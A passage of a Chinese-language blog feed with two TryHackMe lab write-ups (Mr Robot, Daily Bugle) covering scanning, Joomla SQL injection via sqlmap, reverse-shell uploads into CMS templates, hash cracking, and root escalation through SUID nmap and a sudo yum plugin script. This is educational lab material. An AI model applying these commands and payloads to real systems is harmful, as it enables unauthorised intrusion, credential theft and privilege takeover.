    <category term="Windows" scheme="https://ya1orin.github.io/tags/Windows/"/>
    
    <category term="THM" scheme="https://ya1orin.github.io/tags/THM/"/>
    
  </entry>
  
  <entry>
    <title>THM-Mr Robot CTF</title>
    <link href="https://ya1orin.github.io/posts/9f5f1768.html"/>
    <id>https://ya1orin.github.io/posts/9f5f1768.html</id>
    <published>2024-10-09T12:04:27.000Z</published>
    <updated>2024-11-13T05:19:17.378Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>靶机ip：10.10.202.26</p></blockquote><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h2><p><code>nmap --min-rate 10000 -sS -sV -sC 10.10.202.26</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009200958952-1307236102.png" alt="image-20241009200954547"></p><p>发现22，80等端口，但是ssh服务关闭了</p><h2 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009201526558-368574539.png" alt="image-20241009201522229"></p><p>默认页面是一个类似于linux终端的界面，正常的命令执行不了，只能执行页面提供的命令</p><p>每个命令都测试了一下，并没有什么她特别重要的信息，先扫描一下目录</p><p><code>gobuster dir -u http://10.10.202.26/ -w /usr/share/wordlists/dirb/common.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009203017797-1719379315.png" alt="image-20241009203013287"></p><p>结果很多，但是可以看出来这是一个<code>wordpress</code>的站</p><h1 id="后台getshell"><a href="#后台getshell" class="headerlink" title="后台getshell"></a>后台getshell</h1><p>先查看一下哎<code>robots.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009203649868-7394202.png" alt="image-20241009203645784"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009203728050-509535539.png" alt="image-20241009203724196"></p><p>找到第一个<code>key</code></p><p>另一个文件<code>fsocity.dic</code>访问后自动下载了</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009204040584-1051975220.png" alt="image-20241009204036224"></p><p>打开后是个字典</p><p>接着访问扫描出来的结果时，发现在<code>/license</code>文件下有信息</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009204827064-1879933782.png" alt="image-20241009204822920"></p><p>很像<code>base64</code>编码，解码试试</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009205002306-1782867748.png" alt="image-20241009204958248"></p><p>得到一个用户名密码：<code>elliot:ER28-0652</code></p><p>尝试登陆<code>wordpress</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009205219208-88514281.png" alt="image-20241009205215191"></p><p>没想到这是个admn用户，赚翻啦</p><p>直接kali监听一手</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009210509904-1918358012.png" alt="image-20241009210505770"></p><p>将准备好的<a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">php-reverse-shell.php</a>写在<code>404.php</code>上</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009212111435-983517017.png" alt="image-20241009212106883"></p><p>设置好ip和port后保存</p><p>浏览器访问<code>http://10.10.202.26/theme/twentyfifteen/404.php</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009212848299-908977679.png" alt="image-20241009212844443"></p><p>拿到初始权限</p><h1 id="提升至user权限"><a href="#提升至user权限" class="headerlink" title="提升至user权限"></a>提升至user权限</h1><p>切换交互式shell</p><p><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009213103248-2017368856.png" alt="image-20241009213059186"></p><p><code>/home</code>下有<code>robot</code>用户，进入之后发现第二个<code>key</code>，但是我们查看不了，我们能查看另一个文件，根据其内容可以判断出这是<code>robot</code>的用户名和密码</p><p>将密码保存到文件<code>hash</code>中，用<code>hashcat</code>离线破解试试</p><p><code>hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009213509026-1986403223.png" alt="image-20241009213504820"></p><p>破解成功，拿到<code>robot</code>用户的明文密码<code>abcdefghijklmnopqrstuvwxyz</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009213616619-415158260.png" alt="image-20241009213612441"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009213650967-1591154118.png" alt="image-20241009213647123"></p><p>拿到第二个<code>key</code></p><h1 id="提升至root权限"><a href="#提升至root权限" class="headerlink" title="提升至root权限"></a>提升至root权限</h1><p>先尝试<code>sudo -l</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009214047420-696985946.png" alt="image-20241009214043116"></p><p>ok，不让用</p><p>用<code>find</code>查一下特权命令</p><p><code>find / -perm -u=s -type f 2&gt; /dev/null</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009214115004-1182315555.png" alt="image-20241009214110829"></p><p>发现有<code>nmap</code>，可以利用<code>nmap</code>提权</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009214602683-1592532035.png" alt="image-20241009214558352"></p><p>提权成功</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241009214644568-905281974.png" alt="image-20241009214640433"></p><p>在<code>/root</code>目录下找到最后一个<code>key</code></p>]]></content>
    
    
    <summary type="html">TryHackMe系列之Mr Robot CTF</summary>
    
    
    
    <category term="TryHackMe" scheme="https://ya1orin.github.io/categories/TryHackMe/"/>
    
    
    <category term="THM" scheme="https://ya1orin.github.io/tags/THM/"/>
    
    <category term="Linux" scheme="https://ya1orin.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>THM-Daily Bugle</title>
    <link href="https://ya1orin.github.io/posts/4b5f600a.html"/>
    <id>https://ya1orin.github.io/posts/4b5f600a.html</id>
    <published>2024-10-08T05:23:31.000Z</published>
    <updated>2024-11-13T05:19:14.288Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>靶机ip：10.10.158.159</p></blockquote><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h2><p><code>nmap --min-rate 10000 -p- -sV -sC 10.10.158.159 -oN reports/nmap</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008133602854-1151410066.png" alt="image-20241008133559967"></p><p>发现有22，80，3306端口开放，并且在80端口上有<code>robots.txt</code>，开启了mysql服务</p><h2 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008135115833-1217847155.png" alt="image-20241008135112969"></p><p>页面貌似没什么信息，扫描一下目录</p><p><code>gobuster dir -u http://10.10.158.159/ -w /usr/share/wordlists/dirb/common.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008135616416-1722312870.png" alt="image-20241008135614061"></p><p>先看下<code>robots.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008135637011-1331873752.png" alt="image-20241008135634589"></p><p>综上来看这是一个<code>joomla CMS</code>，目录访问后并没有发现什么信息</p><h1 id="SQL漏洞利用"><a href="#SQL漏洞利用" class="headerlink" title="SQL漏洞利用"></a>SQL漏洞利用</h1><p>使用<code>joomscan</code>测试一下</p><p><code>joomscan -u http://10.10.158.159/</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008141255235-581479402.png" alt="image-20241008141252485"></p><p>发现版本是3.7.0，搜索一下是否有可以利用的漏洞</p><p><code>searchsploit joomla 3.7.0</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008141440663-205205108.png" alt="image-20241008141438525"></p><p>发现在该版本存在sql注入，将文件复制下来查看</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008141545963-1681767930.png" alt="image-20241008141543468"></p><p>这里写了使用<code>sqlmap</code>工具进行sql注入，直接照着弄就行</p><p><code>sqlmap -u &quot;http://10.10.158.159/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008143755357-1634909799.png" alt="image-20241008143752393"></p><p>利用成功，得到数据库，继续爆破表</p><p><code>sqlmap -u &quot;http://10.10.158.159/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomla --tables -p list[fullordering]</code> </p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008144208470-98185412.png" alt="image-20241008144206265"></p><p>得到很多表，我们重点看<code>users</code>表，先查看字段的值</p><p><code>sqlmap -u &quot;http://10.10.158.159/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomla -T &#39;#__users&#39; --columns -p list[fullordering]</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008144831007-655266633.png" alt="image-20241008144828658"></p><p>选项直接正常选就行</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008150239571-1068282498.png" alt="image-20241008150237274"></p><p>漫长等待后也是把字段爆破出来了，我们重点看用户名和密码</p><p><code>sqlmap -u &quot;http://10.10.158.159/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomla -T &#39;#__users&#39; -C username,password --dump -p list[fullordering]</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008150415433-886794507.png" alt="image-20241008150413037"></p><p>成功拿到了一组凭据</p><p><code>jonah : $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm</code></p><p>密码是加密数据，这里使用<code>john</code>破解，先将密码保存至<code>hash</code></p><p><code>john hash --wordlist=/usr/share/wordlists/rockyou.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008152021738-1397311919.png" alt="image-20241008152018882"></p><p>得到<code>jonah</code>用户的明文密码<code>spiderman123</code></p><p>登录<code>joomla</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008152334179-1197770814.png" alt="image-20241008152331521"></p><p>登陆成功</p><h1 id="获得初始权限"><a href="#获得初始权限" class="headerlink" title="获得初始权限"></a>获得初始权限</h1><p>查看后发现可以通过改写模板文件的内容getshell</p><p>首先点击右侧<code>Template</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008152509620-2024984243.png" alt="image-20241008152507304"></p><p>再点击右侧的<code>Template</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008152709570-776349238.png" alt="image-20241008152706921"></p><p>选第一个<code>Beez3</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008152751934-1122413670.png" alt="image-20241008152749484"></p><p>为了方便反弹shell，直接修改index.php文件</p><p>将<a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">php-reverse-shell.php</a>写到文件中，并修改其中的ip和port</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008154536026-2069500358.png" alt="image-20241008154533386"></p><p>保存，在kali中起个监听</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008153222944-538312390.png" alt="image-20241008153220414"></p><p>在页面中访问刚才修改的文件</p><p><code>http://10.10.158.159/templates/beez3/index.php</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008154616790-1766426576.png" alt="image-20241008154614259"></p><p>getshell成功！</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008154837476-1061401653.png" alt="image-20241008154835273"></p><p>现在只有一个初始访问权限，还需要横向移动到<code>jjameson</code>用户</p><h1 id="提升至user权限"><a href="#提升至user权限" class="headerlink" title="提升至user权限"></a>提升至user权限</h1><p>先查看文件</p><p><img src="C:/Users/lemon/AppData/Roaming/Typora/typora-user-images/image-20241008160838389.png" alt="image-20241008160838389"></p><p>在查看文件的时候发现在 <code>/var/www/html</code>目录下有个<code>configuration.php</code>文件，查看一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008161000178-1468348786.png" alt="image-20241008160957808"></p><p>发现有密码<code>nv5uz9r3ZEDzVjNu</code>，貌似是root用户的，ssh登录一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008161333840-1625929510.png" alt="image-20241008161331426"></p><p>看样子不是root的密码，尝试ssh登陆<code>jjameson</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008161255917-2029099622.png" alt="image-20241008161253699"></p><p>登陆成功</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008161356936-1355687411.png" alt="image-20241008161354772"></p><p>直接在当前页面找到<code>user.txt</code></p><h1 id="提升至root权限"><a href="#提升至root权限" class="headerlink" title="提升至root权限"></a>提升至root权限</h1><p>先执行<code>sudo -l</code>看看是否有可利用的</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008161550666-1278824895.png" alt="image-20241008161548452"></p><p>可以使用<code>yum</code>提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">TF=$(<span class="built_in">mktemp</span> -d)</span><br><span class="line"><span class="built_in">cat</span> &gt;<span class="variable">$TF</span>/x&lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">[main]</span></span><br><span class="line"><span class="string">plugins=1</span></span><br><span class="line"><span class="string">pluginpath=$TF</span></span><br><span class="line"><span class="string">pluginconfpath=$TF</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> &gt;<span class="variable">$TF</span>/y.conf&lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">[main]</span></span><br><span class="line"><span class="string">enabled=1</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> &gt;<span class="variable">$TF</span>/y.py&lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">import os</span></span><br><span class="line"><span class="string">import yum</span></span><br><span class="line"><span class="string">from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE</span></span><br><span class="line"><span class="string">requires_api_version=&#x27;2.1&#x27;</span></span><br><span class="line"><span class="string">def init_hook(conduit):</span></span><br><span class="line"><span class="string">  os.execl(&#x27;/bin/sh&#x27;,&#x27;/bin/sh&#x27;)</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line">sudo yum -c <span class="variable">$TF</span>/x --enableplugin=y</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008161921642-247827710.png" alt="image-20241008161919145"></p><p>提权成功</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008162019148-1120378338.png" alt="image-20241008162016902"></p><p>在<code>/root</code>目录下找到<code>root.txt</code></p>]]></content>
    
    
    <summary type="html">TryHackMe系列之Daily Bugle</summary>
    
    
    
    <category term="TryHackMe" scheme="https://ya1orin.github.io/categories/TryHackMe/"/>
    
    
    <category term="THM" scheme="https://ya1orin.github.io/tags/THM/"/>
    
    <category term="Linux" scheme="https://ya1orin.github.io/tags/Linux/"/>
    
  </entry>
  
</feed>
